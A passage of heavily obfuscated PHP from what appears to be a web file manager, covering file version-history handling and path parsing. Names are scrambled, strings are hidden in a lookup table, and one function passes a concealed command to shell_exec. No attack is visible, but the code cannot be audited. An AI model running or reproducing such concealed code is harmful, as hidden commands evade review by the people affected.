self::clear($›·¶ğÎ¢, !1); } } else { IO::remove($ø¿€¨ÍÙ[$ğÃãÂ•ä[94]]); self::clearEmptyFolder(IO::pathFather($ø¿€¨ÍÙ[$ğÃãÂ•ä[94]])); } } private static function checkInHistory($º×Ä«Óé) { $Íñ¨¢“— = self::pathHistory($º×Ä«Óé); if (!IO::exist($Íñ¨¢“—)) { $Íñ¨¢“— .= $_SERVER[¹Û¹Æ€][1229]; } return IO::exist($Íñ¨¢“—) ? IO::info($Íñ¨¢“—) : !1; } private static function parsePath($âíêºéŞ) { $¡üÁ ¡ =& $_SERVER[¹Û¹Æ€]; if (!$âíêºéŞ) { return !1; } if ($GLOBALS[$¡üÁ ¡[1230]]) { return; } $Éïè „î = KodIO::parse($âíêºéŞ); $Àã¯°Ø = $Éïè „î[$¡üÁ ¡[43]]; $êñéİÅä = !$Àã¯°Ø || $Àã¯°Ø == KodIO::KOD_IO || $Àã¯°Ø == KodIO::KOD_SHARE_ITEM; if (!$êñéİÅä || !$Éïè „î[$¡üÁ ¡[1231]]) { return !1; } if (substr($âíêºéŞ, 0, strlen(DATA_PATH . $¡üÁ ¡[1232])) == DATA_PATH . $¡üÁ ¡[1232]) { return !1; } if ($Àã¯°Ø == KodIO::KOD_SHARE_ITEM) { $ƒøêèËÀ = IO::init($âíêºéŞ); if ($ƒøêèËÀ->pathParse[$¡üÁ ¡[1148]]) { return self::parsePath($ƒøêèËÀ->pathParse[$¡üÁ ¡[1148]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‹»ô§¾‡ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¡üÁ ¡[1233]); foreach ($‹»ô§¾‡ as $Ï¡ó·†¹) { if (!$Àã¯°Ø && substr($âíêºéŞ, 0, strlen($Ï¡ó·†¹)) == $Ï¡ó·†¹) { return !1; } } self::log($GLOBALS[$¡üÁ ¡[1143]] . $¡üÁ ¡[1234] . $âíêºéŞ); return $âíêºéŞ; } private static function pathHistory($èÉ³ÔÃÙ) { $êƒ‡Ò°€ =& $_SERVER[¹Û¹Æ€]; $îŸ›¥êè = self::$_historyBase . ltrim(KodIO::clear($èÉ³ÔÃÙ), $êƒ‡Ò°€[18]); $îŸ›¥êè = str_replace(array($êƒ‡Ò°€[1235]), array($êƒ‡Ò°€[1236]), $îŸ›¥êè); return $îŸ›¥êè; } public static function log($¯ŠÒÒ˜ù) { } public static function historyCount($æû®íå) { $Şƒ—å»ù =& $_SERVER[¹Û¹Æ€]; $¯¤ŒæİÂ = array(); $’†¶™ó¾ = array(); foreach ($æû®íå as $®ƒª¡›Ñ) { $÷íã§Ğö = get_path_father($®ƒª¡›Ñ); if (!$’†¶™ó¾[$÷íã§Ğö]) { $’†¶™ó¾[$÷íã§Ğö] = array(); } $’†¶™ó¾[$÷íã§Ğö][] = get_path_this($®ƒª¡›Ñ); } foreach ($’†¶™ó¾ as $÷íã§Ğö => $“ÌíñÒí) { $Ô©úÇŞĞ = self::parsePath($÷íã§Ğö); if (!$Ô©úÇŞĞ) { continue; } foreach ($“ÌíñÒí as $ù¹¸½Ö) { $í¤ùÒ³¡ = self::listData(rtrim($Ô©úÇŞĞ, $Şƒ—å»ù[18]) . $Şƒ—å»ù[18] . $ù¹¸½Ö, !1); if ($í¤ùÒ³¡ && $í¤ùÒ³¡[$Şƒ—å»ù[378]]) { $¯¤ŒæİÂ[rtrim($÷íã§Ğö, $Şƒ—å»ù[18]) . $Şƒ—å»ù[18] . $ù¹¸½Ö] = count($í¤ùÒ³¡[$Şƒ—å»ù[378]]); } } } return $¯¤ŒæİÂ; } public static function add($±ŠÑ˜½©) { $ã¼¬³üî =& $_SERVER[¹Û¹Æ€]; $ú‹²Áğõ = self::listData($±ŠÑ˜½©); if (!$ú‹²Áğõ) { return; } $”êÇÎØÍ = Model($ã¼¬³üî[768])->get($ã¼¬³üî[1237]); $Ÿµ°å’µ = $GLOBALS[$ã¼¬³üî[16]][$ã¼¬³üî[99]][$ã¼¬³üî[1215]]; $¯Ë¥ëê± = $”êÇÎØÍ == $ã¼¬³üî[1238] ? min(5, $Ÿµ°å’µ) : $Ÿµ°å’µ; if ($Ÿµ°å’µ <= 0) { return; } $”œãÍı = IO::info($±ŠÑ˜½©); $Òİ¯Íí = $ú‹²Áğõ[$ã¼¬³üî[378]]; if ($”œãÍı[$ã¼¬³üî[86]] == 0) { return; } if ($”œãÍı[$ã¼¬³üî[86]] >= 1024 * 1024 * 500) { return !1; } $½éªô = IO::hashSimple($±ŠÑ˜½©); if ($Òİ¯Íí && $Òİ¯Íí[0][$ã¼¬³üî[187]] == $½éªô) { return !0; } if (array_key_exists($ã¼¬³üî[212], $”œãÍı) && !$”œãÍı[$ã¼¬³üî[212]]) { return !1; } $‚ûç½¶î = short_id(time()); $ıĞÃö²õ = array($ã¼¬³üî[408] => $‚ûç½¶î, $ã¼¬³üî[187] => $½éªô, $ã¼¬³üî[42] => $”œãÍı[$ã¼¬³üî[42]] . $ã¼¬³üî[20] . date($ã¼¬³üî[1239]) . rand_string(1), $ã¼¬³üî[86] => $”œãÍı[$ã¼¬³üî[86]], $ã¼¬³üî[463] => USER_ID, $ã¼¬³üî[210] => time(), $ã¼¬³üî[1240] => $ã¼¬³üî[22]); IO::mkdir($ú‹²Áğõ[$ã¼¬³üî[1241]]); $Çİâ»«î = IO::copy($±ŠÑ˜½©, $ú‹²Áğõ[$ã¼¬³üî[1241]], !1, $ıĞÃö²õ[$ã¼¬³üî[42]]); if (!$Çİâ»«î) { self::clearEmptyFolder($ú‹²Áğõ[$ã¼¬³üî[1241]]); return !1; } array_unshift($Òİ¯Íí, $ıĞÃö²õ); if (count($Òİ¯Íí) > $¯Ë¥ëê±) { $©Äš‚‘ = array_slice($Òİ¯Íí, $¯Ë¥ëê±); foreach ($©Äš‚‘ as $Ï€‡Ä‡ü) { IO::remove($ú‹²Áğõ[$ã¼¬³üî[1241]] . $Ï€‡Ä‡ü[$ã¼¬³üî[42]]); } $Òİ¯Íí = array_slice($Òİ¯Íí, 0, $¯Ë¥ëê±); } return self::saveData($ú‹²Áğõ[$ã¼¬³üî[1242]], $Òİ¯Íí); } public static function remove($­Šƒæ¡Ò, $Ò¹Š˜¿¯) { $ÓŸãÔø =& $_SERVER[¹Û¹Æ€]; $ÔãúÂƒÀ = self::listData($­Šƒæ¡Ò); $‰úö÷Í = array(); if (!$ÔãúÂƒÀ) { return !1; } foreach ($ÔãúÂƒÀ[$ÓŸãÔø[378]] as $ºŞûşùÒ) { if ($ºŞûşùÒ[$ÓŸãÔø[408]] == $Ò¹Š˜¿¯) { IO::remove($ÔãúÂƒÀ[$ÓŸãÔø[1241]] . $ºŞûşùÒ[$ÓŸãÔø[42]]); continue; } $‰úö÷Í[] = $ºŞûşùÒ; } return self::saveData($ÔãúÂƒÀ[$ÓŸãÔø[1242]], $‰úö÷Í); } public static function clear($ĞƒıÇ, $æ¡ëøÃó = true) { $§ü¿Âû =& $_SERVER[¹Û¹Æ€]; $Ê§ş©ùŠ = self::listData($ĞƒıÇ, $æ¡ëøÃó); if (!$Ê§ş©ùŠ) { return !1; } foreach ($Ê§ş©ùŠ[$§ü¿Âû[378]] as $¨í§‹ç¤) { IO::remove($Ê§ş©ùŠ[$§ü¿Âû[1241]] . $¨í§‹ç¤[$§ü¿Âû[42]]); } return self::saveData($Ê§ş©ùŠ[$§ü¿Âû[1242]], array()); } public static function moveHistory($‰¦¬œ¯, $ç–æ¨¹¬ = '', $–è›£” = '') { $ë†Áé =& $_SERVER[¹Û¹Æ€]; $ëü«àŠİ = self::listData($‰¦¬œ¯, !1); if (!$ëü«àŠİ || !$ëü«àŠİ[$ë†Áé[378]]) { return !1; } $œÓâş°„ = $ë†Áé[1229]; $ç–æ¨¹¬ = $ç–æ¨¹¬ ? $ç–æ¨¹¬ : get_path_this($‰¦¬œ¯); $–è›£” = $–è›£” ? $–è›£” : $ëü«àŠİ[$ë†Áé[1241]]; $ì§İ°ÇÈ = substr(get_path_this($ëü«àŠİ[$ë†Áé[1242]]), 0, -strlen($œÓâş°„)); foreach ($ëü«àŠİ[$ë†Áé[378]] as $Ìîï”•Ş => $†îëÜ°¡) { $Í˜‚–Ë = $ç–æ¨¹¬ . substr($†îëÜ°¡[$ë†Áé[42]], strlen($ì§İ°ÇÈ)); $‹÷¯ËĞˆ = IO::move($ëü«àŠİ[$ë†Áé[1241]] . $†îëÜ°¡[$ë†Áé[42]], $–è›£”, !1, $Í˜‚–Ë); if ($‹÷¯ËĞˆ) { $ëü«àŠİ[$ë†Áé[378]][$Ìîï”•Ş][$ë†Áé[42]] = $Í˜‚–Ë; } } $ëü«àŠİ[$ë†Áé[1242]] = IO::move($ëü«àŠİ[$ë†Áé[1242]], $–è›£”, !1, $ç–æ¨¹¬ . $œÓâş°„); self::saveData($ëü«àŠİ[$ë†Áé[1242]], $ëü«àŠİ[$ë†Áé[378]]); self::clearEmptyFolder($ëü«àŠİ[$ë†Áé[1241]]); } public static function rollback($¸€â™‡ğ, $ıçâ ô) { $óÛ —â€ =& $_SERVER[¹Û¹Æ€]; $¶€ºøÃŒ = self::listData($¸€â™‡ğ); if (!$¶€ºøÃŒ) { return; } $¥ñ•¹»ø = IO::info($¸€â™‡ğ); foreach ($¶€ºøÃŒ[$óÛ —â€[378]] as $ñ•Òª£ç => $Ä¯ğîßî) { if ($Ä¯ğîßî[$óÛ —â€[408]] == $ıçâ ô) { self::add($¸€â™‡ğ); $¹¦˜ñáÔ = $¶€ºøÃŒ[$óÛ —â€[1241]] . $Ä¯ğîßî[$óÛ —â€[42]]; $İ—‚â®¤ = IO::copy($¹¦˜ñáÔ, IO::pathFather($¸€â™‡ğ), REPEAT_REPLACE, $¥ñ•¹»ø[$óÛ —â€[42]]); if ($İ—‚â®¤) { self::remove($¸€â™‡ğ, $ıçâ ô); } return $İ—‚â®¤; } } return !1; } public static function setDetail($×ŸÙ‡”», $ÍÃË¤³Û, $ìş¥ËĞ) { $Çø°¦ÓÚ =& $_SERVER[¹Û¹Æ€]; $’†Ùïõú = self::listData($×ŸÙ‡”»); if (!$’†Ùïõú) { return; } foreach ($’†Ùïõú[$Çø°¦ÓÚ[378]] as $ÁÉ¯Š´ => $µàú¬´á) { if ($µàú¬´á[$Çø°¦ÓÚ[408]] == $ÍÃË¤³Û) { $’†Ùïõú[$Çø°¦ÓÚ[378]][$ÁÉ¯Š´][$Çø°¦ÓÚ[1240]] = $ìş¥ËĞ; self::saveData($’†Ùïõú[$Çø°¦ÓÚ[1242]], $’†Ùïõú[$Çø°¦ÓÚ[378]]); return !0; } } return !1; } public static function fileInfo($“‘Ï³æï, $»¶àÙ¹) { $Ùıí«Ø =& $_SERVER[¹Û¹Æ€]; $ØîİÄÌ = self::listData($“‘Ï³æï); if (!$ØîİÄÌ) { show_json(LNG($Ùıí«Ø[115]), !1); } $Í’‘Í°Ï = $Ùıí«Ø[22]; foreach ($ØîİÄÌ[$Ùıí«Ø[378]] as $öÌÊ«Û± => $œ˜Û­Á—) { if ($œ˜Û­Á—[$Ùıí«Ø[408]] != $»¶àÙ¹) { continue; } $Í’‘Í°Ï = $ØîİÄÌ[$Ùıí«Ø[1241]] . $œ˜Û­Á—[$Ùıí«Ø[42]]; break; } if (!$Í’‘Í°Ï) { show_json(LNG($Ùıí«Ø[115]), !1); } return IO::info($Í’‘Í°Ï); } public static function fileOut($Š”¸‰Ë», $´á€úŞÃ, $Ùçô€‡ = false) { $¾¿Ë³Ù÷ =& $_SERVER[¹Û¹Æ€]; $ß‹óƒŠ = self::fileInfo($Š”¸‰Ë», $´á€úŞÃ); $™”°ğ–æ =& $GLOBALS[$¾¿Ë³Ù÷[17]]; $Ùçô€‡ = isset($™”°ğ–æ[$¾¿Ë³Ù÷[1192]]) && $™”°ğ–æ[$¾¿Ë³Ù÷[1192]] == 1; if (isset($™”°ğ–æ[$¾¿Ë³Ù÷[43]]) && $™”°ğ–æ[$¾¿Ë³Ù÷[43]] == $¾¿Ë³Ù÷[1243]) { return IO::fileOutImage($ß‹óƒŠ[$¾¿Ë³Ù÷[94]], $™”°ğ–æ[$¾¿Ë³Ù÷[1244]]); } IO::fileOut($ß‹óƒŠ[$¾¿Ë³Ù÷[94]], $Ùçô€‡, get_path_this($Š”¸‰Ë»)); } public static function listData($¿×şÌ¬š, $¤ı¸ò… = true) { $¤øïå =& $_SERVER[¹Û¹Æ€]; if ($¤ı¸ò… && !IO::exist($¿×şÌ¬š)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¿×şÌ¬š, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $…ºöÜ­¡ = self::pathHistory($¿×şÌ¬š); $ØÀ“¶ã­ = array($¤øïå[1242] => $…ºöÜ­¡ . $¤øïå[1229], $¤øïå[1241] => rtrim(get_path_father($…ºöÜ­¡), $¤øïå[18]) . $¤øïå[18], $¤øïå[378] => array()); $¨»¤ß”ˆ = IO::getContent($ØÀ“¶ã­[$¤øïå[1242]]); if ($¨»¤ß”ˆ) { $é×¦ßßü = json_decode($¨»¤ß”ˆ, !0); if (is_array($é×¦ßßü)) { $ØÀ“¶ã­[$¤øïå[378]] = $é×¦ßßü; } } return $ØÀ“¶ã­; } private static function saveData($¾›ò¢©, $§æâÓŒÀ) { $˜Åµš­û =& $_SERVER[¹Û¹Æ€]; self::log($˜Åµš­û[1245] . $¾›ò¢© . $˜Åµš­û[81] . count($§æâÓŒÀ), $˜Åµš­û[750]); if ($§æâÓŒÀ) { return IO::setContent($¾›ò¢©, json_encode($§æâÓŒÀ)); } $äŒÌüƒ½ = IO::pathFather($¾›ò¢©); IO::remove($¾›ò¢©); self::clearEmptyFolder($äŒÌüƒ½); return !0; } public static function clearEmptyFolder($Óç—ÄËú) { $Œ÷ƒô =& $_SERVER[¹Û¹Æ€]; if (trim($Óç—ÄËú, $Œ÷ƒô[18]) == trim(self::$_historyBase, $Œ÷ƒô[18])) { return; } $ã’€¹œ± = IO::pathFather($Óç—ÄËú); $í¯ĞÉÜÁ = IO::has($Óç—ÄËú, !0); if ($í¯ĞÉÜÁ[$Œ÷ƒô[217]] > 0 || $í¯ĞÉÜÁ[$Œ÷ƒô[218]] > 0) { return; } IO::remove($Óç—ÄËú); self::clearEmptyFolder($ã’€¹œ±); } private static function getBasePath() { $¶ÁØÁÃĞ =& $_SERVER[¹Û¹Æ€]; $Ã‹†Œºø = Model($¶ÁØÁÃĞ[1246])->get($¶ÁØÁÃĞ[1247]); if ($Ã‹†Œºø) { if (!IO::exist($Ã‹†Œºø)) { IO::mkdir($Ã‹†Œºø); } if (get_path_this($Ã‹†Œºø) == $¶ÁØÁÃĞ[1232]) { $ª½úÊƒà = $¶ÁØÁÃĞ[1248] . rand_string(8); @rename($Ã‹†Œºø, get_path_father($Ã‹†Œºø) . $¶ÁØÁÃĞ[18] . $ª½úÊƒà); $Ã‹†Œºø = DATA_PATH . $ª½úÊƒà . $¶ÁØÁÃĞ[18]; file_put_contents(DATA_PATH . $¶ÁØÁÃĞ[1182], $¶ÁØÁÃĞ[22]); Model($¶ÁØÁÃĞ[1246])->set($¶ÁØÁÃĞ[1247], $Ã‹†Œºø); } return $Ã‹†Œºø; } $Ã‹†Œºø = DATA_PATH . $¶ÁØÁÃĞ[1248] . rand_string(8) . $¶ÁØÁÃĞ[18]; $Ã‹†Œºø = IO::mkdir($Ã‹†Œºø); $Ã‹†Œºø = rtrim($Ã‹†Œºø, $¶ÁØÁÃĞ[18]) . $¶ÁØÁÃĞ[18]; file_put_contents($Ã‹†Œºø . $¶ÁØÁÃĞ[1182], $¶ÁØÁÃĞ[22]); file_put_contents(DATA_PATH . $¶ÁØÁÃĞ[1182], $¶ÁØÁÃĞ[22]); Model($¶ÁØÁÃĞ[1246])->set($¶ÁØÁÃĞ[1247], $Ã‹†Œºø); return $Ã‹†Œºø; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\122\145\143\x79\143\154\145\x7d"; const KOD_USER_FAV = "\173\x75\163\145\x72\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\x46\151\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\x72\x46\x69\x6c\x65\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\122\x6f\157\x74\x53\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\x75\x73\145\162\123\150\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\x53\x68\141\x72\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\162\x65\x54\157\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\162\145\x49\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\x65\x49\x74\145\155\x4c\151\156\153\175"; const KOD_SEARCH = "\x7b\x73\145\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\157\x63\153\175"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\x52\x65\156\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\166\x65\162\x7d"; public static function typeList() { $¦”Îá–” =& $_SERVER[¹Û¹Æ€]; return array($¦”Îá–”[1249] => self::KOD_SOURCE, $¦”Îá–”[1250] => self::KOD_USER_RECYCLE, $¦”Îá–”[1251] => self::KOD_USER_FAV, $¦”Îá–”[1252] => self::KOD_USER_FILE_TAG, $¦”Îá–”[1253] => self::KOD_USER_FILE_TYPE, $¦”Îá–”[1254] => self::KOD_GROUP_ROOT_SELF, $¦”Îá–”[1255] => self::KOD_USER_SHARE, $¦”Îá–”[1256] => self::KOD_USER_SHARE_LINK, $¦”Îá–”[1257] => self::KOD_USER_SHARE_TO_ME, $¦”Îá–”[1258] => self::KOD_SHARE_ITEM, $¦”Îá–”[1259] => self::KOD_SHARE_LINK, $¦”Îá–”[1260] => self::KOD_SEARCH, $¦”Îá–”[1261] => self::KOD_BLOCK, $¦”Îá–”[1262] => self::KOD_IO, $¦”Îá–”[1263] => self::KOD_USER_RECENT, $¦”Îá–”[1264] => self::KOD_USER_DRIVER); } public static function parse($’Ş‡Ã™Á) { $§§ºÄ¦¢ =& $_SERVER[¹Û¹Æ€]; $’Ş‡Ã™Á = self::clear($’Ş‡Ã™Á); $Æá—“ŸÊ = array_values(self::typeList()); preg_match($§§ºÄ¦¢[1265], $’Ş‡Ã™Á, $ÂÈàºùË); $‡ü¿¹€ = array($§§ºÄ¦¢[431] => !1, $§§ºÄ¦¢[1266] => !1, $§§ºÄ¦¢[428] => !1, $§§ºÄ¦¢[94] => $’Ş‡Ã™Á, $§§ºÄ¦¢[1167] => !1, $§§ºÄ¦¢[1166] => $§§ºÄ¦¢[22]); if (is_array($ÂÈàºùË) && count($ÂÈàºùË) == 5) { $Å±¢»©ò = $§§ºÄ¦¢[1267] . $ÂÈàºùË[2] . $§§ºÄ¦¢[336]; if (in_array($Å±¢»©ò, $Æá—“ŸÊ)) { $‡ü¿¹€[$§§ºÄ¦¢[1167]] = $ÂÈàºùË[1]; $‡ü¿¹€[$§§ºÄ¦¢[43]] = $Å±¢»©ò; $‡ü¿¹€[$§§ºÄ¦¢[1268]] = substr($Å±¢»©ò, 1, -1); $‡ü¿¹€[$§§ºÄ¦¢[408]] = $ÂÈàºùË[3]; } $‡ü¿¹€[$§§ºÄ¦¢[1166]] = $ÂÈàºùË[4]; } $ÚÛßù°é = array($§§ºÄ¦¢[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $‡ü¿¹€[$§§ºÄ¦¢[1231]] = in_array($‡ü¿¹€[$§§ºÄ¦¢[43]], $ÚÛßù°é); return $‡ü¿¹€; } public static function isTruePath($ûğô¹í) { $£¤´ÖÛÄ =& $_SERVER[¹Û¹Æ€]; if (substr($ûğô¹í, 0, 1) != $£¤´ÖÛÄ[1267]) { return !0; } if (strpos($ûğô¹í, $£¤´ÖÛÄ[417]) === 0) { return !0; } if (strpos($ûğô¹í, $£¤´ÖÛÄ[1235]) === 0) { return !0; } if (strpos($ûğô¹í, $£¤´ÖÛÄ[1269]) === 0) { return !0; } if (strpos($ûğô¹í, $£¤´ÖÛÄ[1270]) === 0) { return !0; } if (strpos($ûğô¹í, $£¤´ÖÛÄ[1271]) === 0) { return !0; } return !1; } public static function clear($ôñµ³ˆ”) { $¦ÖÆ¼õö =& $_SERVER[¹Û¹Æ€]; $ôñµ³ˆ” = str_replace(array($¦ÖÆ¼õö[1075], $¦ÖÆ¼õö[12]), $¦ÖÆ¼õö[63], $ôñµ³ˆ”); $ôñµ³ˆ” = str_replace($¦ÖÆ¼õö[107], $¦ÖÆ¼õö[18], $ôñµ³ˆ”); $îİØÖ‡¹ = $¦ÖÆ¼õö[1272]; if (substr($ôñµ³ˆ”, 0, 3) == $¦ÖÆ¼õö[1273]) { $ôñµ³ˆ” = substr($ôñµ³ˆ”, 3); } while (strstr($ôñµ³ˆ”, $îİØÖ‡¹)) { $ôñµ³ˆ” = str_replace($îİØÖ‡¹, $¦ÖÆ¼õö[18], $ôñµ³ˆ”); } $ôñµ³ˆ” = preg_replace($¦ÖÆ¼õö[1274], $¦ÖÆ¼õö[18], $ôñµ³ˆ”); if ($ôñµ³ˆ” == $¦ÖÆ¼õö[18]) { return $¦ÖÆ¼õö[18]; } $ôñµ³ˆ” = rtrim($ôñµ³ˆ”, $¦ÖÆ¼õö[18]); return $ôñµ³ˆ”; } public static function sourceID($Øç”ŸÌÄ) { $ÖšÂÑª =& $_SERVER[¹Û¹Æ€]; $´˜ùñÜõ = self::parse($Øç”ŸÌÄ); if ($´˜ùñÜõ[$ÖšÂÑª[43]] !== self::KOD_SOURCE) { show_json(LNG($ÖšÂÑª[1275]), !1); } return $´˜ùñÜõ[$ÖšÂÑª[408]]; } public static function make($ëŸ¤˜­î) { if (!$ëŸ¤˜­î) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ëŸ¤˜­î)); } public static function makeShare($š›ç•¾Ñ, $ï¸æÔÚÉ) { return self::makePath(self::KOD_SHARE_ITEM, $š›ç•¾Ñ, $ï¸æÔÚÉ); } public static function makeFileTypePath($´û¸ÜŞâ) { return self::makePath(self::KOD_USER_FILE_TYPE, $´û¸ÜŞâ); } public static function makeFileTagPath($Ëƒ¶õ«ç) { return self::makePath(self::KOD_USER_FILE_TAG, $Ëƒ¶õ«ç); } public static function makePath($êöƒµ÷º, $àæÎ…íË = '', $À•¦Ñş³ = '') { $¯İîÎ =& $_SERVER[¹Û¹Æ€]; $©³ğÕŞ¹ = substr($êöƒµ÷º, 1, -1); $¿–åŒø = $¯İîÎ[1276] . $©³ğÕŞ¹ . $¯İîÎ[1277] . $àæÎ…íË . $¯İîÎ[1278]; $¿–åŒø = $À•¦Ñş³ ? $¿–åŒø . $À•¦Ñş³ . $¯İîÎ[18] : $¿–åŒø; return $¿–åŒø; } public static function hashPath($«½æóÇé, $¢ô®¥Åö = true) { $¦ª‘•…‰ =& $_SERVER[¹Û¹Æ€]; $µ±Óè¨ø = is_array($«½æóÇé) ? $«½æóÇé : IO::info($«½æóÇé); $ÊÆáÄš¨ = _get($µ±Óè¨ø, $¦ª‘•…‰[1279], $¦ª‘•…‰[22]); if (!$ÊÆáÄš¨ && isset($µ±Óè¨ø[$¦ª‘•…‰[411]])) { $µ±Óè¨ø = IO::info(KodIO::make($µ±Óè¨ø[$¦ª‘•…‰[411]])); $ÊÆáÄš¨ = _get($µ±Óè¨ø, $¦ª‘•…‰[1279], $¦ª‘•…‰[22]); } if (!$ÊÆáÄš¨ && $¢ô®¥Åö) { $¿¶ÑûË = KodIO::parse($µ±Óè¨ø[$¦ª‘•…‰[94]]); if (!$¿¶ÑûË[$¦ª‘•…‰[43]]) { $ÊÆáÄš¨ = IO::hashSimple($µ±Óè¨ø[$¦ª‘•…‰[94]]); } } if (!$ÊÆáÄš¨) { $ÊÆáÄš¨ = md5($µ±Óè¨ø[$¦ª‘•…‰[94]] . $µ±Óè¨ø[$¦ª‘•…‰[86]] . $µ±Óè¨ø[$¦ª‘•…‰[95]]); } return $ÊÆáÄš¨; } public static function hashPathSafe($†ñÇÅ©©, $š³¤Ÿ×ä = true) { $¹ë¾äÎÚ =& $_SERVER[¹Û¹Æ€]; $Ïº›×µà = self::hashPath($†ñÇÅ©©, $š³¤Ÿ×ä); return md5($Ïº›×µà . $¹ë¾äÎÚ[1280] . Model($¹ë¾äÎÚ[768])->get($¹ë¾äÎÚ[769])); } public static function initSystemPath() { $’üá€Ä =& $_SERVER[¹Û¹Æ€]; if (defined($’üá€Ä[1281])) { return; } define($’üá€Ä[1281], self::systemPath($’üá€Ä[1282])); define($’üá€Ä[1283], self::systemPath($’üá€Ä[1284])); define($’üá€Ä[1285], self::systemPath($’üá€Ä[1286])); define($’üá€Ä[1287], self::systemPath($’üá€Ä[1288])); IOHistory::bindEvent(); } public static function systemPath($ÉØ’øï) { $’¼–õ =& $_SERVER[¹Û¹Æ€]; $Îˆ‰ßÜ“ = $’¼–õ[1289] . ucfirst($ÉØ’øï); $½¬æ·ƒæ = Model($’¼–õ[768])->get($Îˆ‰ßÜ“); if ($½¬æ·ƒæ) { return $½¬æ·ƒæ; } if ($ÉØ’øï == $’¼–õ[1282]) { $½¬æ·ƒæ = self::make(Model($’¼–õ[823])->systemRootPathAdd($’¼–õ[553])); } else { $½¬æ·ƒæ = self::systemPath($’¼–õ[1282]); $¼§‚ğÍâ = self::sourceID($½¬æ·ƒæ); $½¬æ·ƒæ = self::make(Model($’¼–õ[823])->mkdir($¼§‚ğÍâ, $ÉØ’øï)); } Model($’¼–õ[768])->set($Îˆ‰ßÜ“, $½¬æ·ƒæ); return $½¬æ·ƒæ; } public static function systemFolder($ÓÈ¦ïùÓ) { $ò Ññòœ = IO_PATH_SYSTEM_SOURCE . $ÓÈ¦ïùÓ; $÷áœĞè„ = Cache::get($ò Ññòœ); if (!$÷áœĞè„) { $Ù†Š„½Ş = IO::infoFull($ò Ññòœ); if (!$Ù†Š„½Ş) { $÷áœĞè„ = IO::mkdir($ò Ññòœ, REPEAT_SKIP); } else { $÷áœĞè„ = $Ù†Š„½Ş[$_SERVER[¹Û¹Æ€][94]]; } Cache::set($ò Ññòœ, $÷áœĞè„, 3600 * 10); } return $÷áœĞè„; } public static function defaultDriver() { return Model($_SERVER[¹Û¹Æ€][765])->defaultDriver(); } public static function defaultIO() { $åäÜ®¨ =& $_SERVER[¹Û¹Æ€]; $À©‰ Æå = self::defaultDriver(); return $åäÜ®¨[1290] . $À©‰ Æå[$åäÜ®¨[408]] . $åäÜ®¨[1278]; } public static function defaultDriverInit() { static $¼†«‰ƒ­ = false; if ($¼†«‰ƒ­) { return $¼†«‰ƒ­; } $¼†«‰ƒ­ = IO::init(self::defaultIO()); return $¼†«‰ƒ­; } public static function fileTypeList() { $É‡Æú³Ï =& $_SERVER[¹Û¹Æ€]; $ò³¯Ûğ¯ = $GLOBALS[$É‡Æú³Ï[16]][$É‡Æú³Ï[1291]]; foreach ($ò³¯Ûğ¯ as $«ÁäĞÇ => $¯ã·ßÇ¡) { $´ õåş = $É‡Æú³Ï[1292] . $«ÁäĞÇ; $½“–†©¯ = LNG($´ õåş); if ($´ õåş != $½“–†©¯) { $ò³¯Ûğ¯[$«ÁäĞÇ][$É‡Æú³Ï[42]] = $½“–†©¯; } } return $ò³¯Ûğ¯; } public static function diskList($ ‚ã˜š = true) { $òïëøèÔ = $_SERVER[¹Û¹Æ€][1293]; if ($ ‚ã˜š) { $–Š¶¢â© = Cache::get($òïëøèÔ); if (is_array($–Š¶¢â©)) { return $–Š¶¢â©; } } $–Š¶¢â© = self::diskListGet(); Cache::set($òïëøèÔ, $–Š¶¢â©, 60); return $–Š¶¢â©; } public static function diskListGet() { $ù”õÓ«× =& $_SERVER[¹Û¹Æ€]; $ŠÛ©½Û = array(); if ($GLOBALS[$ù”õÓ«×[16]][$ù”õÓ«×[1294]] == $ù”õÓ«×[1295]) { $ÃÌ€×Ö‡ = $ù”õÓ«×[1296]; for ($¦¡¡ìğı = 0; $¦¡¡ìğı < strlen($ÃÌ€×Ö‡); $¦¡¡ìğı++) { $ß¢•è¡ù = $ÃÌ€×Ö‡[$¦¡¡ìğı] . $ù”õÓ«×[1297]; if (file_exists($ß¢•è¡ù)) { $ŠÛ©½Û[] = $ß¢•è¡ù; } } return $ŠÛ©½Û; } if (!function_exists($ù”õÓ«×[108])) { $ŠÛ©½Û[] = $ù”õÓ«×[833]; return $ŠÛ©½Û; } $Èş„ÌŠÎ = explode($ù”õÓ«×[12], shell_exec($ù”õÓ«×[1298])); array_shift($Èş„ÌŠÎ); array_pop($Èş„ÌŠÎ); $µš’ãÑÒ = array($ù”õÓ«×[1299], $ù”õÓ«×[1300], $ù”õÓ«×[1301], $ù”õÓ«×[1302], $ù”õÓ«×[1303], $ù”õÓ«×[1304], $ù”õÓ«×[1305], $ù”õÓ«×[1306]); foreach ($Èş„ÌŠÎ as $„œÈÀ) { $…ªíÍ¿„ = preg_split($ù”õÓ«×[1307], $„œÈÀ); $ß¢•è¡ù = $…ªíÍ¿„[count($…ªíÍ¿„) - 1]; if (!strstr($…ªíÍ¿„[0], $ù”õÓ«×[1308]) || !$ß¢•è¡ù) { continue; } $¢µ¾ù‘ = rtrim($ß¢•è¡ù, $ù”õÓ«×[18]) . $ù”õÓ«×[18]; if (in_array($¢µ¾ù‘, 